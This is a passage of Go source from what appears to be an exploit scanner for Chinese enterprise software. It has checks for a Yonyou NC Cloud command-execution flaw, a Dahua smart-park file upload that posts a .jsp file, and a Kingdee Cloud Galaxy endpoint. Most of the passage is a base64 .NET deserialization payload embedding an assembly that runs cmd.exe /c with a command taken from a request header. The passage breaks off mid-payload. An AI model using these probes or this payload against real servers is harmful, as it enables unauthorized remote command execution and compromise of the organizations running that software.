			retryCount++
			continue
		}
		defer resp.Body.Close()
		respBody, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return ""
		}
		bodys = string(respBody)
		if resp.StatusCode == http.StatusOK || len(bodys) == 0 {
			//fmt.Println("存在漏洞")
			return "[+] 存在用友NC Cloud存在前台远程命令执行漏洞,漏洞URL：" + vurl
		}
		break

	}
	return bodys
}

// 大华智慧园区综合管理平台
func dhzh(url string) string {
	// 创建一个自定义的 http.Transport，并禁用证书验证
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// 创建具有超时设置的HTTP客户端

	client := &http.Client{
		Timeout:   time.Second * 10, // 设置超时时间为10秒
		Transport: transport,
	}
	bodys := ""
	vurl := url + "/emap/devicePoint_addImgIco?hasSubsystem=true"
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("upload", "a.jsp")
	if err != nil {
		return ""
	}
	part.Write([]byte("go_nishizhu"))

	writer.Close()

	req, err := http.NewRequest("POST", vurl, body)
	if err != nil {
		return ""
	}
	req.Header.Set("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)")
	req.Header.Set("Content-Type", writer.FormDataContentType())

	//client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	bodys = string(respBody)
	if strings.Contains(bodys, "ico_res_") {
		return "[+] 存在大华智慧园区综合管理平台任意文件上传漏洞,漏洞URL：" + vurl
	} else {
		bodys = ""
	}
	return bodys

}

// 金蝶云星空
func jdyxk(url string) string {
	bodys := ""
	vurl := url + "/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc"
	data := `{"ap0": "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMctAAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMAAAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3IrT2JqZWN0U3Vycm9nYXRlK09iamVjdFNlcmlhbGl6ZWRSZWYCAAAABHR5cGULbWVtYmVyRGF0YXMDBR9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyDgAAAAkPAAAACRAAAAABBQAAAAQAAAAJEQAAAAkSAAAAAQYAAAAEAAAACRMAAAAJFAAAAAEHAAAABAAAAAkVAAAACRYAAAABCAAAAAQAAAAJFwAAAAkYAAAAAQkAAAAEAAAACRkAAAAJGgAAAAEKAAAABAAAAAkbAAAACRwAAAABCwAAAAQAAAAJHQAAAAkeAAAABAwAAAAcU3lzdGVtLkNv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b2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAYiAAAATlN5c3RlbS5Db3JlLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAQAAAABwAAAAkDAAAACgkkAAAACggIAAAAAAoICAEAAAABEQAAAA8AAAAGJQAAAPUCU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABASAAAABwAAAAkEAAAACgkoAAAACggIAAAAAAoICAEAAAABEwAAAA8AAAAGKQAAAN8DU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFAAAAAcAAAAJBQAAAAoJLAAAAAoICAAAAAAKCAgBAAAAARUAAAAPAAAABi0AAADmAlN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFgAAAAcAAAAJBgAAAAkwAAAACTEAAAAKCAgAAAAACggIAQAAAAEXAAAADwAAAAYyAAAA7wFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABAYAAAABwAAAAkHAAAACgk1AAAACggIAAAAAAoICAEAAAABGQAAAA8AAAAGNgAAAClTeXN0ZW0uV2ViLlVJLldlYkNvbnRyb2xzLlBhZ2VkRGF0YVNvdXJjZQQAAAAGNwAAAE1TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYRAaAAAABwAAAAkIAAAACAgAAAAACAgKAAAACAEACAEACAEACAgAAAAAARsAAAAPAAAABjkAAAApU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5EZXNpZ25lclZlcmIEAAAABjoAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAcAAAABQAAAA0CCTsAAAAICAMAAAAJCwAAAAEdAAAADwAAAAY9AAAANFN5c3RlbS5SdW50aW1lLlJlbW90aW5nLkNoYW5uZWxzLkFnZ3JlZ2F0ZURpY3Rpb25hcnkEAAAABj4AAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5EB4AAAABAAAACQkAAAAQHwAAAAIAAAAJCgAAAAkKAAAAECAAAAACAAAABkEAAAAACUEAAAAEJAAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAgAAAAhEZWxlZ2F0ZQdtZXRob2QwAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCUIAAAAJQwAAAAEoAAAAJAAAAAlEAAAACUUAAAABLAAAACQAAAAJRgAAAAlHAAAAATAAAAAkAAAACUgAAAAJSQAAAAExAAAAJAAAAAlKAAAACUsAAAABNQAAACQAAAAJTAAAAAlNAAAAATsAAAAEAAAACU4AAAAJTwAAAARCAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BlAAAADVAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABlIAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGUwAAAARMb2FkCgRDAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQlTAAAACT4AAAAJUgAAAAZWAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQZXAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgFEAAAAQgAAAAZYAAAAzAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAACVIAAAAGWwAAAAhHZXRUeXBlcwoBRQAAAEMAAAAJWwAAAAk+AAAACVIAAAAGXgAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkGXwAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkIAAAACgFGAAAAQgAAAAZgAAAAtgNTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZiAAAAhAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GYwAAAA1HZXRFbnVtZXJhdG9yCgFHAAAAQwAAAAljAAAACT4AAAAJYgAAAAZmAAAARVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbU3lzdGVtLlR5cGVdIEdldEVudW1lcmF0b3IoKQZnAAAAlAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0gR2V0RW51bWVyYXRvcigpCAAAAAoBSAAAAEIAAAAGaAAAAMACU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQm9vbGVhbiwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZqAAAAHlN5c3RlbS5Db2xsZWN0aW9ucy5JRW51bWVyYXRvcgZrAAAACE1vdmVOZXh0CgFJAAAAQwAAAAlrAAAACT4AAAAJagAAAAZuAAAAEkJvb2xlYW4gTW92ZU5leHQoKQZvAAAAGVN5c3RlbS5Cb29sZWFuIE1vdmVOZXh0KCkIAAAACgFKAAAAQgAAAAZwAAAAvQJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tl